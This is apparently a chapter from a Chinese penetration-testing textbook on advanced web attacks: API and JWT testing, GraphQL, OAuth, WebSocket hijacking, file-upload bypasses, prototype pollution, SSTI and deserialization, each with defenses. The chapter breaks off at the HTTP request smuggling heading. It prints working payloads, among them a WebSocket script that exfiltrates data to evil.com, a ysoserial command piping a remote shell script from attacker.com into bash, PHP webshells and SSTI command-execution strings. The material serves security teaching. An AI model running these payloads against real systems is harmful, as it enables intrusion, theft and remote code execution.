---
title: "14.21 高级Web安全测试技术"
type: docs
weight: 9
---

## 14.21 高级Web安全测试技术

前文覆盖了OWASP Top 10的核心测试方法——注入、认证、访问控制、SSRF等。本节聚焦现代Web架构中涌现的高级攻击面：API安全、OAuth 2.0协议、WebSocket通信、文件上传深层利用，以及原型污染、SSTI、反序列化等进阶技术。这些技术在实际渗透测试中出现频率极高，但OWASP Top 10并未单独列出，属于"隐藏的第11项"。

### 14.21.1 API安全测试

现代Web应用的前端与后端通信几乎完全依赖API。根据Postman《2024 State of the API》报告，超过70%的Web流量来自API调用。OWASP于2023年发布了独立的[API Security Top 10](https://owasp.org/API-Security/)，将API风险从通用Web风险中剥离出来。

#### 14.21.1.1 RESTful API测试要点

RESTful API的攻击面远大于传统Web页面，原因在于：API端点数量多、参数结构复杂、认证机制多样（Bearer Token、API Key、OAuth），且开发者常假设"前端已做校验"而放松后端检查。

**API端点枚举**

发现隐藏端点是API渗透的第一步。常用方法：

| 方法 | 工具 | 适用场景 |
|------|------|----------|
| 字典爆破 | ffuf、feroxbuster、gobuster | 已知框架（Spring、Express） |
| 文档泄露 | 直接访问 `/swagger.json`、`/openapi.json`、`/api-docs` | 未关闭的开发文档 |
| JS文件分析 | LinkFinder、katana | 前端SPA中的API调用 |
| 流量代理 | Burp Suite、mitmproxy | 有账户的已认证场景 |
| 版本枚举 | 遍历 `/v1/`、`/v2/`、`/v3/` | 旧版本API可能缺少新安全修复 |

```bash
# 1. 字典爆破API端点
ffuf -u https://api.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,301,403 \
  -H "Authorization: Bearer <token>"

# 2. 检查API文档泄露
curl -s https://api.example.com/swagger.json | jq '.paths | keys'
curl -s https://api.example.com/openapi.yaml
curl -s https://api.example.com/graphql  # GraphiQL界面

# 3. 从JavaScript中提取API端点
# 安装：pip install linkfinder
python3 linkfinder.py -i https://example.com/static/js/main.js -o cli

# 4. 版本枚举
for v in v1 v2 v3 beta internal; do
  curl -s -o /dev/null -w "%{http_code} /$v/users\n" "https://api.example.com/$v/users"
done
```

**HTTP方法测试**

同一个端点在不同HTTP方法下可能有完全不同的行为。开发者通常只实现了GET和POST，但未显式拒绝PUT、DELETE、PATCH、OPTIONS。

```bash
# 测试每个端点支持的方法
curl -X OPTIONS https://api.example.com/users/1 -i
# 查看返回的 Allow 头

# 尝试用不同方法访问同一资源
for method in GET POST PUT PATCH DELETE TRACE; do
  curl -X $method -s -o /dev/null -w "$method %{http_code}\n" \
    https://api.example.com/users/1
done

# 关键测试场景：
# 普通用户对 /users/1 发 PUT 请求修改 role 字段
curl -X PUT https://api.example.com/users/1 \
  -H "Authorization: Bearer <普通用户token>" \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","role":"admin"}'
```

**批量分配（Mass Assignment）漏洞**

当API直接将请求体反序列化为ORM对象时，攻击者可以注入额外字段（如 `role`、`is_admin`、`balance`）来提升权限。这是2012年GitHub被入侵的根因。

```bash
# 正常注册请求
curl -X POST https://api.example.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"123456"}'

# 注入管理员字段
curl -X POST https://api.example.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"123456","role":"admin","is_verified":true}'

# 常见可注入字段名
# role, is_admin, admin, permissions, is_staff, is_superuser
# account_type, user_type, access_level, verified, email_verified
```

**参数污染测试**

不同组件对重复参数的解析方式不同，可能导致绕过：

```bash
# 后端取第一个值 vs 取最后一个值 vs 合并为数组
curl "https://api.example.com/transfer?amount=100&amount=999999"

# WAF检查第一个amount=100，后端取最后一个amount=999999
# URL编码绕过
curl "https://api.example.com/users?id=1%26id=2"
# 某些框架会将 %26 解析为 &，导致 id=1&id=2

# JSON参数污染
curl -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong","password":"correct"}'
# 某些JSON解析器取最后一个password
```

#### 14.21.1.2 JWT安全测试

JSON Web Token（JWT）是API认证的主流方案，但其实现错误率极高。PortSwigger研究显示，超过50%的JWT实现存在至少一个可利用漏洞。

**JWT结构与解码**

JWT由三部分组成：`Header.Payload.Signature`，以 `.` 分隔，每部分Base64URL编码。

```bash
# 解码JWT
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# 解码Header
echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null; echo
# {"alg":"HS256","typ":"JWT"}

# 解码Payload
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null; echo
# {"user_id":123,"role":"user"}
```

**JWT常见攻击向量**

| 攻击 | 原理 | 利用方式 |
|------|------|----------|
| 算法混淆（alg:none） | 将alg设为none，跳过签名验证 | 直接修改Payload，删除签名 |
| HS256→RS256混淆 | 用公钥（可获取）作为HMAC密钥 | 服务端用RS256验签但接受HS256 |
| 弱密钥爆破 | HMAC密钥太简单 | hashcat/john爆破 |
| kid注入 | kid参数用于查找密钥文件 | 路径遍历读取已知文件 |
| jku/x5u注入 | 指定远程公钥URL | 用自己的JWK端点替换 |

```bash
# 使用jwt_tool自动化测试
# 安装：git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py "$TOKEN" -X a    # 所有攻击
python3 jwt_tool.py "$TOKEN" -X n    # alg:none
python3 jwt_tool.py "$TOKEN" -X k    # 密钥爆破
python3 jwt_tool.py "$TOKEN" -X pb   # 公钥注入

# hashcat爆破HS256密钥
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# 手动构造alg:none攻击
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user_id":1,"role":"admin"}
# 将签名部分设为空字符串
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"user_id":1,"role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "${HEADER}.${PAYLOAD}."
```

**JWT安全审计清单**

```text
□ alg字段是否可被篡改为none？
□ 服务端是否真的验证了签名，还是只解码了Payload？
□ HMAC密钥是否足够强（>=256位随机）？
□ kid参数是否进行了输入校验？
□ jku/x5u是否可被替换为外部URL？
□ Token过期时间是否合理（<=15分钟）？
□ 是否存在Token刷新机制（Refresh Token）？
□ 敏感操作是否要求重新认证而非仅依赖Token？
```

#### 14.21.1.3 GraphQL安全测试

GraphQL提供单一端点，客户端自定义查询，这带来了独特的安全挑战。

**内省查询（Introspection）**

内省是GraphQL的元数据查询功能，可以获取完整的Schema结构，相当于API的"目录"。

```graphql
# 获取所有类型和字段
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name }
        }
      }
    }
  }
}

# 快速获取所有查询名称
{
  __schema {
    queryType {
      fields { name args { name type { name } } }
    }
  }
}

# 获取所有变更（mutation）
{
  __schema {
    mutationType {
      fields { name args { name type { name } } }
    }
  }
}
```

**GraphQL特有攻击**

```graphql
# 1. 批量查询拒绝服务（Query Batching）
[
  { "query": "{ user(id:1) { name email } }" },
  { "query": "{ user(id:2) { name email } }" },
  { "query": "{ user(id:3) { name email } }" }
  # ... 发送数千个查询
]

# 2. 深层嵌套查询（DoS）
# 每个user有friends，friends又有friends...
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
# 如果没有深度限制，这会消耗指数级资源

# 3. 字段级Suggestion攻击
# GraphQL错误信息可能泄露可用字段名
{ user(id: 1) { emial } }
# 错误信息："Did you mean 'email'?"

# 4. 通过mutation执行未授权操作
mutation {
  deleteUser(id: 1) { success }
}

mutation {
  updateUser(id: 1, input: { role: "admin" }) { id role }
}

# 5. SQL注入（通过GraphQL参数）
{
  user(name: "admin' OR '1'='1") { id name role }
}
```

**GraphQL安全测试工具**

```bash
# graphqlmap - GraphQL渗透测试
# 安装：pip install graphqlmap
graphqlmap -u https://api.example.com/graphql --method POST

# 使用InQL Burp扩展
# 自动解析Schema并生成测试请求

# clairvoyance - 即使禁用内省也能恢复Schema
# 安装：pip install clairvoyance
clairvoyance -t https://api.example.com/graphql -w wordlist.txt
```

**GraphQL防御措施**

```text
1. 生产环境禁用内省查询
2. 设置查询深度限制（通常<=10层）
3. 设置查询复杂度限制
4. 实施速率限制（按IP和按用户）
5. 使用持久化查询（Persisted Queries）替代自由查询
6. 每个字段级别实施授权检查
7. 错误信息不泄露Schema结构
```

---

### 14.21.2 OAuth 2.0安全测试

OAuth 2.0是现代Web应用第三方登录和授权的基石。其协议流程涉及多个组件（客户端、授权服务器、资源服务器、用户代理），每一环节都可能引入漏洞。

#### 14.21.2.1 OAuth 2.0授权流程回顾

```mermaid
sequenceDiagram
    participant U as 用户浏览器
    participant C as 客户端应用
    participant A as 授权服务器
    participant R as 资源服务器

    U->>C: 点击"用XX登录"
    C->>U: 重定向到授权服务器
    Note over U,A: redirect_uri + client_id + scope + state
    U->>A: 请求授权
    A->>U: 用户确认授权
    A->>U: 重定向回客户端（带授权码）
    Note over U,C: redirect_uri?code=xxx&state=yyy
    U->>C: 携带code访问回调
    C->>A: 用code换access_token
    Note over C,A: client_id + client_secret + code
    A->>C: 返回access_token（可选refresh_token）
    C->>R: 用access_token访问资源
    R->>C: 返回用户数据
```

#### 14.21.2.2 OAuth常见漏洞与利用

**1. 重定向URI绕过**

授权服务器在将用户重定向回客户端时，会校验redirect_uri是否在注册的白名单中。校验逻辑缺陷是最常见的OAuth漏洞。

```bash
# 常见绕过方式

# 1) 开放重定向链
# 如果目标站点有开放重定向漏洞，可以通过它中转
redirect_uri=https://target.com/redirect?url=https://attacker.com

# 2) 路径遍历
redirect_uri=https://target.com/callback/../attacker
redirect_uri=https://target.com/callback/../../attacker

# 3) 子域名绕过
redirect_uri=https://attacker.target.com/callback
# 如果只校验了域名后缀而非完整域名

# 4) 参数注入
redirect_uri=https://target.com/callback?evil=https://attacker.com

# 5) URL片段（Fragment）
redirect_uri=https://target.com/callback#

# 6) 编码绕过
redirect_uri=https://target.com/callback%00.attacker.com
redirect_uri=https://target.com/callback%252f%252f.attacker.com

# 7) 端口差异
redirect_uri=https://target.com:8080/callback
# 某些实现只检查域名不检查端口
```

**2. CSRF（state参数缺失）**

state参数是OAuth防CSRF的核心机制。如果授权服务器不强制要求state参数，或者客户端不验证state值，攻击者可以将自己的授权码绑定到受害者账户。

```text
攻击流程：
1. 攻击者用自己的账户完成OAuth授权，获得code=ATTACKER_CODE
2. 攻击者构造URL：https://victim.com/callback?code=ATTACKER_CODE
3. 诱导受害者访问该URL
4. 受害者应用用ATTACKER_CODE换取Token
5. 受害者账户被绑定到攻击者的第三方账户
6. 攻击者通过第三方登录进入受害者的账户
```

**3. 授权码泄露**

```bash
# 通过Referer头泄露
# 如果回调页面包含外部资源（图片、JS），授权码可能通过Referer头泄露
# 回调URL：https://target.com/callback?code=SECRET_CODE
# 页面中包含：<img src="https://tracker.com/pixel">
# 浏览器发送：Referer: https://target.com/callback?code=SECRET_CODE

# 防御：回调后立即302重定向到不含code的URL
# 设置 Referrer-Policy: no-referrer

# 通过日志泄露
# Web服务器访问日志记录了完整URL（含query参数）
# Nginx默认日志格式会记录 $request_uri
# 确保日志中过滤code参数
```

**4. Token安全**

```bash
# Token通过URL传输（而非Header）
# URL会被记录在浏览器历史、服务器日志、CDN日志中
# 错误：GET /api/user?access_token=xxx
# 正确：Authorization: Bearer xxx

# Token存储位置
# localStorage -> 受XSS威胁
# sessionStorage -> 同上，但窗口关闭后失效
# HttpOnly Cookie -> 最安全，但需要防CSRF
# 内存变量（JavaScript变量） -> 适合SPA，刷新后丢失
```

**5. Scope提升**

```bash
# 注册时申请的scope和实际请求的scope不一致
# 客户端注册：scope=read
# 实际请求：scope=read write admin
# 如果授权服务器不校验scope是否在注册范围内，攻击者可以获取额外权限

# 测试方法
# 正常请求
GET /authorize?scope=read&...
# 修改scope
GET /authorize?scope=read+write+admin&...
# 检查返回的Token是否真的包含了扩展的权限
```

#### 14.21.2.3 OAuth安全测试清单

```text
□ redirect_uri是否严格匹配（不允许通配符、路径遍历）？
□ state参数是否强制要求且服务端验证？
□ 授权码是否一次性使用（不可重放）？
□ 授权码有效期是否足够短（<=10分钟）？
□ Token是否通过安全通道传输（HTTPS + Authorization头）？
□ refresh_token是否安全存储且有轮转机制？
□ scope是否限制在注册时申请的范围内？
□ 回调URL是否设置了Referrer-Policy: no-referrer？
□ PKCE是否用于公开客户端（移动端、SPA）？
```

---

### 14.21.3 WebSocket安全测试

WebSocket提供全双工通信，绕过了传统HTTP请求-响应模型。其安全问题常被忽略，因为大多数安全工具默认不分析WebSocket流量。

#### 14.21.3.1 WebSocket协议基础

WebSocket连接通过HTTP Upgrade握手建立，之后在同一条TCP连接上进行双向通信。

```http
# 握手请求
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://example.com

# 握手响应
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

#### 14.21.3.2 WebSocket攻击类型

**1. 跨站WebSocket劫持（CSWSH）**

与CSRF类似，但效果更严重——攻击者可以在自己的页面中建立与目标的WebSocket连接，读取实时消息。

```text
攻击前提：
- 目标WebSocket服务使用Cookie认证
- 服务端不验证Origin头（或验证不严格）

攻击步骤：
1. 攻击者在evil.com上放置恶意页面
2. 受害者访问evil.com（已登录目标站点）
3. 恶意JS建立 ws://target.com/chat 连接
4. 浏览器自动携带Cookie完成握手
5. 攻击者的页面获得双向通信能力
```

```javascript
// 恶意页面中的攻击代码
const ws = new WebSocket('wss://target.com/chat');
ws.onopen = () => {
  // 已建立连接，可发送命令
  ws.send(JSON.stringify({ type: 'get_messages', channel: 'private' }));
};
ws.onmessage = (event) => {
  // 将窃取的数据发送到攻击者服务器
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: event.data
  });
};
```

**2. 消息注入**

```javascript
// 使用wscat进行消息注入测试
// 安装：npm install -g wscat

// 连接
wscat -c ws://example.com/ws

// 测试注入：尝试订阅未授权频道
> {"type":"subscribe","channel":"admin"}
> {"type":"subscribe","channel":"system_logs"}

// 测试消息格式畸形
> {"type":"subscribe","channel":"admin' OR 1=1--"}
> {"type":"subscribe","channel":null}
> {"type":"subscribe"}
> {"type":"<script>alert(1)</script>"}

// 测试命令注入
> {"type":"exec","command":"ls -la"}
> {"type":"query","sql":"SELECT * FROM users"}
```

**3. WebSocket拒绝服务**

```bash
# 大量并发连接
for i in $(seq 1 1000); do
  wscat -c ws://example.com/ws &
done

# 超大消息
python3 -c "
import websocket
ws = websocket.create_connection('ws://example.com/ws')
ws.send('A' * 10000000)  # 10MB消息
"

# 高频消息洪泛
python3 -c "
import websocket, threading
ws = websocket.create_connection('ws://example.com/ws')
def flood():
    while True:
        ws.send('flood')
for _ in range(100):
    threading.Thread(target=flood).start()
"
```

#### 14.21.3.3 WebSocket安全测试工具

| 工具 | 用途 | 安装 |
|------|------|------|
| wscat | 命令行WebSocket客户端 | `npm i -g wscat` |
| Burp Suite | 拦截/修改/重放WebSocket消息 | 内置 |
| OWASP ZAP | WebSocket被动/主动扫描 | 内置 |
| websocat | Rust版wscat，支持二进制 | `cargo install websocat` |
| WebSocket King | Chrome扩展，可视化测试 | Chrome商店 |

```bash
# Burp Suite WebSocket测试流程：
# 1. 配置浏览器代理指向Burp（127.0.0.1:8080）
# 2. 访问目标站点，建立WebSocket连接
# 3. 在 Burp -> Proxy -> WebSockets history 查看消息
# 4. 右键消息 -> Send to Repeater
# 5. 在Repeater中修改消息内容并重放
# 6. 观察响应差异
```

#### 14.21.3.4 WebSocket安全防御

```text
1. 严格校验Origin头（白名单，非正则匹配）
2. 使用wss://（TLS加密），禁止ws://
3. 消息层面实施认证（不要仅依赖握手时的Cookie）
4. 限制单连接消息频率和消息大小
5. 输入校验：对每条消息做JSON Schema校验
6. 实施连接数限制（per-IP和per-user）
7. 使用令牌轮转：定期更换会话Token
```

---

### 14.21.4 文件上传漏洞深度利用

文件上传是Web应用中最危险的功能之一。一旦上传成功且可执行，攻击者通常能直接获得服务器控制权。

#### 14.21.4.1 绕过文件类型检查的技术

文件类型检查通常在三个层面实施：前端JavaScript、后端MIME检测、文件内容检测。每一层都有对应的绕过方法。

**扩展名绕过**

```text
1. 双扩展名
   shell.php.jpg    # Apache某些配置下，以最后一个可识别的扩展名解析
   shell.jpg.php    # 某些中间件取第一个扩展名
   shell.php%00.jpg # 空字节截断（PHP < 5.3.4、Java旧版本）

2. 大小写变体
   shell.pHp        # Windows不区分大小写
   shell.Php5       # PHP 5.x默认处理
   shell.phtml      # Apache中PHP的替代扩展名
   shell.phar       # PHP归档文件

3. 特殊扩展名
   shell.php.jpg.php.jpg  # 多重扩展名
   shell.php.              # 末尾加点
   shell.php               # 末尾加空格
   shell.php::$DATA        # Windows NTFS流（::$DATA）

4. 配置文件覆盖
   .htaccess              # Apache：AddType application/x-httpd-php .jpg
   .user.ini              # PHP：auto_prepend_file=shell.jpg
   web.config             # IIS：自定义MIME映射
```

**Content-Type绕过**

```bash
# 将Content-Type从application/octet-stream改为图片类型
curl -X POST https://target.com/upload \
  -F "file=@shell.php;type=image/jpeg" \
  -F "submit=Upload"

# 常见安全MIME类型白名单
# image/jpeg, image/png, image/gif
# application/pdf
# 仅检查Content-Type即可绕过，因为该值由客户端控制
```

**文件头（Magic Bytes）伪造**

```bash
# 服务器通过文件头判断真实类型
# 在WebShell前面添加合法文件头

# JPEG文件头
echo -n 'FFD8FFE0' | xxd -r -p > shell_with_header.php
cat shell.php >> shell_with_header.php

# GIF文件头（最常用）
echo -n 'GIF89a' > shell.gif.php
cat shell.php >> shell.gif.php

# PNG文件头
echo -n '89504E470D0A1A0A' | xxd -r -p > shell.png
cat shell.php >> shell.png

# PDF文件头
echo -n '%PDF-1.4' > shell.pdf.php
cat shell.php >> shell.pdf.php
```

**图片马（Image + WebShell）**

```bash
# 将WebShell嵌入图片的EXIF数据中
# 需要服务端解析图片EXIF或include图片文件

# 使用exiftool注入
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# 生成的文件既是合法JPEG又包含PHP代码

# 使用copy命令合并
copy /b normal_image.jpg + shell.php shell_image.jpg  # Windows
cat normal_image.jpg shell.php > shell_image.jpg       # Linux

# 配合文件包含漏洞使用
# 如果目标有 LFI 漏洞可以包含上传的图片：
# https://target.com/include.php?file=uploads/shell_image.jpg
```

#### 14.21.4.2 利用服务器解析漏洞

**IIS解析漏洞**

```text
# IIS 6.0 特有
shell.asp;.jpg          # 分号后面的被忽略，按asp执行
shell.asa               # asa也按ASP处理
shell.cer               # cer也按ASP处理
shell.cdx               # cdx也按ASP处理
shell.asp/shell.jpg     # /后面的被忽略
shell.asp::$DATA        # NTFS流

# IIS 7.x FastCGI
shell.jpg/.php          # 如果php.ini设置cgi.fix_pathinfo=1
```

**Nginx解析漏洞**

```text
# Nginx + PHP-FPM配置不当
shell.jpg/.php          # 通过路径信息触发PHP解析
shell.jpg%00.php        # 空字节截断
shell.jpg/.xxx          # 任意扩展名（如果配置了.php）

# 根本原因：cgi.fix_pathinfo=1时，PHP尝试向前查找存在的文件
# /uploads/shell.jpg/.php -> PHP发现shell.jpg存在 -> 执行它
```

**Apache解析漏洞**

```text
# Apache多扩展名解析规则
# 从右向左查找可识别的扩展名
shell.php.xxx           # xxx不识别，向前找php -> 按PHP执行
shell.php.123           # 同上
shell.php.jpg.123       # php和jpg都不识别? 实际从右向左找到jpg

# .htaccess利用
# 上传以下内容的 .htaccess 文件：
AddType application/x-httpd-php .jpg
# 之后上传的jpg文件将被PHP解析器处理
```

#### 14.21.4.3 文件上传安全防御

```python
import os
import uuid
import magic
from PIL import Image

def secure_upload(file_stream, original_filename):
    """
    多层防御的文件上传处理
    """
    ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}
    ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
    MAX_SIZE = 5 * 1024 * 1024  # 5MB
    
    # 第1层：文件大小检查
    content = file_stream.read()
    if len(content) > MAX_SIZE:
        return False, "文件过大"
    file_stream.seek(0)
    
    # 第2层：扩展名白名单（取最后一个扩展名）
    ext = os.path.splitext(original_filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False, "不允许的文件类型"
    
    # 第3层：MIME类型检查（读取文件头部）
    mime = magic.from_buffer(content[:2048], mime=True)
    if mime not in ALLOWED_MIMES:
        return False, "文件内容与扩展名不匹配"
    
    # 第4层：图片完整性验证（用Pillow打开确认是合法图片）
    try:
        img = Image.open(file_stream)
        img.verify()  # 验证图片结构完整性
        file_stream.seek(0)
    except Exception:
        return False, "损坏或伪造的图片文件"
    
    # 第5层：重新编码图片（去除嵌入的恶意代码）
    file_stream.seek(0)
    img = Image.open(file_stream)
    clean_filename = str(uuid.uuid4()) + '.jpg'
    output_path = os.path.join('/data/uploads', clean_filename)
    img.convert('RGB').save(output_path, 'JPEG', quality=95)
    
    # 第6层：设置安全文件权限（不可执行）
    os.chmod(output_path, 0o644)
    
    return True, clean_filename
```

关键防御原则：

```text
1. 白名单 > 黑名单：不要试图列出所有危险扩展名
2. 永远不要信任客户端提供的Content-Type
3. 重新编码图片：去除EXIF中的代码注入
4. 随机化文件名：UUID替代原始文件名
5. 存储在Web根目录之外：通过代理脚本提供下载
6. 设置Content-Disposition: attachment：防止浏览器直接执行
7. 禁用上传目录的脚本执行权限
```

```nginx
# Nginx：禁止上传目录执行PHP
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}
```

---

### 14.21.5 原型污染（Prototype Pollution）

原型污染是JavaScript特有的漏洞类型，出现在Node.js后端和浏览器前端。OWASP将其归入A03:2021（注入）类别。2019年至今，lodash、jQuery、express等主流库均被发现存在原型污染漏洞。

#### 14.21.5.1 漏洞原理

JavaScript中每个对象都有一个隐式的 `__proto__` 属性，指向其构造函数的 `prototype`。如果攻击者能修改 `Object.prototype`，所有新创建的对象都会继承被污染的属性。

```javascript
// 正常对象
let user = { name: "alice", role: "user" };
console.log(user.isAdmin); // undefined

// 原型污染攻击
// 漏洞点：不安全的深层合并函数
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);  // 递归合并
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 攻击者发送：
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

// 现在所有对象都受影响：
let new_user = { name: "bob", role: "user" };
console.log(new_user.isAdmin); // true ← 被污染了！
```

#### 14.21.5.2 原型污染利用场景

**场景一：权限绕过**

```javascript
// Express中间件中的权限检查
app.post('/admin', (req, res) => {
  if (req.body.role !== 'admin') {
    return res.status(403).send('Forbidden');
  }
  // ... admin operations
});

// 攻击：通过原型污染让所有对象默认有 role: 'admin'
// POST /admin 的请求体中注入 {"__proto__": {"role": "admin"}}
// 之后 req.body.role === 'admin' 对任意请求体都为true
```

**场景二：RCE（远程代码执行）**

```javascript
// pug/ejs模板引擎中的RCE
// pug模板引擎允许通过 options.outputFunctionName 指定输出函数名
// 如果原型污染注入了 outputFunctionName:
// {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');"}}

// ejs模板引擎
// 通过污染 settings 或 outputFunction 实现RCE
// {"__proto__": {"settings": {"view options": {"escapeFunction": "process.mainModule.require"}}}}
```

#### 14.21.5.3 检测与防御

```javascript
// 1. 检测：发送污染payload，观察行为变化
// POST {"__proto__": {"testprop": "testval"}}
// 然后检查新对象是否有 testprop

// 2. 防御：冻结原型
Object.freeze(Object.prototype);

// 3. 防御：使用 Object.create(null) 创建无原型对象
let safeObj = Object.create(null);
safeObj.__proto__; // undefined

// 4. 防御：过滤 __proto__ 和 constructor 键
function safeMerge(target, source) {
  for (let key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;  // 跳过危险键
    }
    // ... normal merge logic
  }
}

// 5. 使用Map替代普通对象存储用户输入
let data = new Map();
data.set(userInputKey, value);  // Map不受原型污染影响
```

---

### 14.21.6 服务端模板注入（SSTI）

SSTI是A03:2021（注入）的子类。当用户输入被直接拼接到模板引擎中时，攻击者可以执行任意代码。SSTI与XSS的区别在于：XSS在浏览器执行，SSTI在服务器执行——这意味着SSTI可以直接读取服务器文件、执行系统命令。

#### 14.21.6.1 检测SSTI

发送数学表达式，观察是否被服务器计算：

```text
{{7*7}}       -> 如果返回49，存在SSTI（Jinja2/Twig/Smarty等）
${7*7}        -> 如果返回49，存在SSTI（FreeMarker/Mako等）
#{7*7}        -> 如果返回49，存在SSTI（Thymeleaf等）
<%= 7*7 %>    -> 如果返回49，存在SSTI（ERB/Ruby等）
{{=7*7}}      -> 如果返回49，存在SSTI（Go模板等）
```

**SSTI通用检测Payload**

```text
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
{{=7*7}}
${{7*7}}
*{7*7}
#{ 7*7 }
{{constructor.constructor("return this")()}}
```

#### 14.21.6.2 各模板引擎利用

**Jinja2（Python/Flask）**

```python
# 读取文件
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 遍历找到 <class 'os._wrap_close'> 或类似
# 然后：
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['popen']('id').read() }}

# 简化版（常用编号413为os._wrap_close，但版本不同可能不同）
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# 使用lipsum模块
{{ lipsum.__globals__['os'].popen('id').read() }}
```

**Twig（PHP/Symfony）**

```twig
# Twig 1.x
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# 通用方法
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

**FreeMarker（Java/Spring）**

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}

# 通过TemplateModel
<#assign classloader=product?api.class.protectionDomain.classLoader>
<#assign clazz=classloader.loadClass("freemarker.template.utility.Execute")>
<#assign ex=clazz?new()>${ex("cat /etc/passwd")}
```

**Smarty（PHP）**

```smarty
{php}echo `id`;{/php}
{system('id')}
```

#### 14.21.6.3 SSTI安全防御

```text
1. 永远不要将用户输入直接拼接到模板字符串中
2. 使用渲染引擎的自动转义功能（Jinja2默认不转义HTML）
3. 使用沙箱环境运行模板（如Jinja2的SandboxedEnvironment）
4. 对用户输入只作为数据传入，不作为模板的一部分
5. 最小权限原则：模板引擎进程不应有root权限
```

```python
# 错误：用户输入作为模板
template = env.from_string(f"Hello {user_input}")  # SSTI!
template.render()

# 正确：用户输入作为数据变量
template = env.from_string("Hello {{ name }}")
template.render(name=user_input)  # 安全
```

---

### 14.21.7 反序列化漏洞

反序列化漏洞在2017年被OWASP列为十大风险之一。当应用反序列化不可信数据时，攻击者可以构造恶意对象实现远程代码执行。

#### 14.21.7.1 原理与影响

序列化是将对象转换为字节流（便于存储或传输），反序列化是其逆过程。如果反序列化过程中触发了对象的"魔术方法"（如 `__wakeup`、`__destruct`、`readObject`、`readResolve`），且这些方法中有危险操作，攻击者就能执行任意代码。

**各语言的危险方法**

| 语言 | 危险方法 | 常见攻击面 |
|------|----------|------------|
| PHP | `__wakeup()`、`__destruct()`、`__toString()` | unserialize() |
| Java | `readObject()`、`readResolve()`、`readExternal()` | ObjectInputStream.readObject() |
| Python | `__reduce__()`、`__getstate__()`、`__setstate__()` | pickle.loads()、yaml.load() |
| Ruby | `load()`、`_load()`、`marshal_load()` | Marshal.load()、YAML.load() |
| .NET | `GetObjectData()`、`OnDeserialized()` | BinaryFormatter、Json.NET TypeNameHandling |

#### 14.21.7.2 利用示例

**PHP反序列化**

```php
// 漏洞代码
class Logger {
    public $logFile;
    public $content;
    
    function __destruct() {
        file_put_contents($this->logFile, $this->content);
    }
}

// 攻击者构造Payload
$payload = new Logger();
$payload->logFile = '/var/www/html/shell.php';
$payload->content = '<?php system($_GET["cmd"]); ?>';
echo urlencode(serialize($payload));
// O:6:"Logger":2:{s:7:"logFile";s:28:"/var/www/html/shell.php";s:7:"content";s:49:"<?php system($_GET["cmd"]); ?>";}
```

**Java反序列化**

```bash
# 使用ysoserial生成Payload
# 安装：https://github.com/frohoff/ysoserial
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh | bash' | base64

# 使用Burp Suite插件
# 1. 安装 Java Deserialization Scanner
# 2. 自动检测序列化特征（ac ed 00 05）
# 3. 自动尝试已知Gadget Chain

# 关键Payload识别
# Java序列化流以 AC ED 00 05 开头
# Base64编码后以 rO0AB 开头
```

**Python反序列化**

```python
# pickle反序列化RCE
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# 传输payload到目标，目标执行 pickle.loads(payload) 时会执行 id
```

#### 14.21.7.3 防御措施

```text
1. 绝不反序列化不可信数据（最根本的防御）
2. 使用安全的序列化格式（JSON、Protocol Buffers）替代原生序列化
3. 如果必须使用原生序列化，实施白名单过滤允许的类
4. Java：使用 ObjectInputFilter（JEP 290，Java 9+）
5. PHP：使用 json_encode/json_decode 替代 serialize/unserialize
6. Python：使用 json 替代 pickle；yaml.load() 必须指定 Loader=SafeLoader
7. 实施完整性校验（HMAC签名），防止Payload被篡改
```

---

### 14.21.8 HTTP请求走私（HTTP Request Smuggling）

